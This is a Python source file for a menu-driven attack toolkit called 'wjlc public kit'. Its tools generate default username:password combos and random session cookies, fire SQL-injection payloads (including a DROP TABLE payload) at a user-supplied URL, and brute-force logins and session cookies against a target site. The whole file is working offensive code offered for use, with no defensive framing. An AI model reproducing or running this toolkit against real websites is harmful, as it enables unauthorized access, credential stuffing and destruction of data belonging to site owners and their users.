       import random
import string
import time
import httpx
import os
from colorama import Fore, Style, init

init(autoreset=True)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_header():
    print(Fore.BLUE + "=== wjlc public kit ===")

def pause():
    input(Fore.BLUE + "\nPress Enter to return to the main menu...")

# Tool 1 - Login Generator
def login_generator():
    print(Fore.BLUE + "\n[+] Login Generator")
    common_usernames = ["admin", "administrator", "root", "user", "test", "guest"]
    common_passwords = ["admin", "1234", "123456", "password", "admin123", "letmein"]

    try:
        count = int(input("How many combos to generate? (default 20): ") or "20")
    except:
        count = 20

    for _ in range(count):
        user = random.choice(common_usernames)
        pwd = random.choice(common_passwords)
        print(f"{user}:{pwd}")
    pause()

# Tool 2 - Cookie Generator
def cookie_generator():
    print(Fore.BLUE + "\n[+] Cookie Generator")
    try:
        count = int(input("How many cookies? (default 5): ") or "5")
    except:
        count = 5

    for _ in range(count):
        session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        signature = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
        cookie = f"s%3A{session_id}.{signature}"
        print(cookie)
        time.sleep(0.05)
    pause()

# Tool 3 - SQLi Tester
def sqli_checker():
    print(Fore.BLUE + "\n[+] SQLi Method Tester")
    url = input("Enter the target URL (with ?param=): ").strip()
    sqli_payloads = [
        "' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "admin' --", "' OR 1=1#",
        "' OR 1=1/*", "' OR ''='", "\" OR \"\"=\"", "' OR 1=1 LIMIT 1 OFFSET 1 --"
    ]

    try:
        for payload in sqli_payloads:
            full_url = url + payload
            print(f"[?] Trying: {full_url}")
            response = httpx.get(full_url, timeout=5)
            if "error" not in response.text.lower():
                print(Fore.GREEN + f"[+] Possible success with payload: {payload}")
            else:
                print(Fore.YELLOW + f"[-] Likely failed: {payload}")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
    pause()

# Tool 4 - Cookie Login Tester
def cookie_login():
    print(Fore.BLUE + "\n[+] Cookie Login Tester")
    site_url = input("Enter the login-protected URL: ").strip()
    cookies_input = input("Enter cookies separated by commas:\n").split(",")

    for cookie in cookies_input:
        cookie = cookie.strip()
        try:
            headers = {"Cookie": f"session={cookie}"}
            r = httpx.get(site_url, headers=headers, follow_redirects=True, timeout=5)
            if "login" not in r.text.lower():
                print(Fore.GREEN + f"[+] Valid cookie: {cookie}")
                break
            else:
                print(Fore.YELLOW + f"[-] Invalid cookie: {cookie}")
        except Exception as e:
            print(Fore.RED + f"[!] Request failed: {e}")
    else:
        print(Fore.RED + "[x] All cookies failed.")
    pause()

# Tool 5 - SQLi Attack Attempt
def sqli_attack():
    print(Fore.BLUE + "\n[+] SQLi Attack Launcher")
    url = input("Enter the vulnerable endpoint (e.g. http://example.com/login): ").strip()
    field = input("Enter GET or POST: ").strip().upper()

    sqli_payloads = [
        "' OR '1'='1", "' OR 1=1 --", "' UNION SELECT NULL, NULL --",
        "' AND 1=1 --", "' AND 1=2 --", "'; DROP TABLE users; --"
    ]

    try:
        for payload in sqli_payloads:
            print(f"[?] Trying payload: {payload}")
            if field == "GET":
                full_url = f"{url}?input={payload}"
                r = httpx.get(full_url, timeout=5)
            else:
                r = httpx.post(url, data={"input": payload}, timeout=5)

            if "login" not in r.text.lower() and "error" not in r.text.lower():
                print(Fore.GREEN + f"[+] Possible success\n{r.text[:150]}...\n")
            else:
                print(Fore.YELLOW + f"[-] Response indicates failure.")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
    pause()

# Tool 6 - Cookie BruteForcer
def cookie_bruteforcer():
    print(Fore.BLUE + "\n[+] Cookie BruteForcer")
    target_url = input("Enter URL to test cookies against: ").strip()
    path = input("Path to cookie wordlist (one per line): ").strip()

    try:
        with open(path, 'r') as f:
            cookies = [line.strip() for line in f.readlines()]
    except Exception as e:
        print(Fore.RED + f"[!] Failed to open wordlist: {e}")
        return pause()

    for cookie in cookies:
        try:
            headers = {"Cookie": f"session={cookie}"}
            response = httpx.get(target_url, headers=headers, timeout=5)
            if "login" not in response.text.lower():
                print(Fore.GREEN + f"[+] Valid Cookie Found: {cookie}")
                break
            else:
                print(Fore.YELLOW + f"[-] Invalid: {cookie}")
        except Exception as e:
            print(Fore.RED + f"[!] Error with cookie {cookie}: {e}")
    else:
        print(Fore.RED + "[x] No valid cookies found.")
    pause()

# Tool 7 - Login BruteForcer
def login_bruteforcer():
    print(Fore.BLUE + "\n[+] Login BruteForcer")
    url = input("Target login URL: ").strip()
    method = input("POST or GET? ").strip().upper()
    user_field = input("Username field name (e.g., username): ").strip()
    pass_field = input("Password field name (e.g., password): ").strip()
    combo_path = input("Path to combo list (user:pass per line): ").strip()

    try:
        with open(combo_path, 'r') as f:
            combos = [line.strip().split(":", 1) for line in f.readlines()]
    except Exception as e:
        print(Fore.RED + f"[!] Failed to load combo list: {e}")
        return pause()

    for username, password in combos:
        try:
            data = {user_field: username, pass_field: password}
            if method == "POST":
                r = httpx.post(url, data=data, timeout=5)
            else:
                r = httpx.get(url, params=data, timeout=5)

            if "login" not in r.text.lower():
                print(Fore.GREEN + f"[+] SUCCESS: {username}:{password}")
                break
            else:
                print(Fore.YELLOW + f"[-] FAIL: {username}:{password}")
        except Exception as e:
            print(Fore.RED + f"[!] Error with {username}:{password} - {e}")
    else:
        print(Fore.RED + "[x] No working credentials found.")
    pause()

# Main CLI Menu
def main():
    while True:
        clear_screen()
        print_header()
        print(Fore.BLUE + """
[1] Login Generator
[2] Cookie Generator
[3] SQLi Method Checker
[4] Cookie Login Tester
[5] SQLi Attack Attempt
[6] Cookie BruteForcer
[7] Login BruteForcer
[0] Exit
        """)
        choice = input("Select a tool: ").strip()
        if choice == "1":
            login_generator()
        elif choice == "2":
            cookie_generator()
        elif choice == "3":
            sqli_checker()
        elif choice == "4":
            cookie_login()
        elif choice == "5":
            sqli_attack()
        elif choice == "6":
            cookie_bruteforcer()
        elif choice == "7":
            login_bruteforcer()
        elif choice == "0":
            print("Goodbye.")
            break
        else:
            print("Invalid input.")
            pause()

if __name__ == "__main__":
    main()

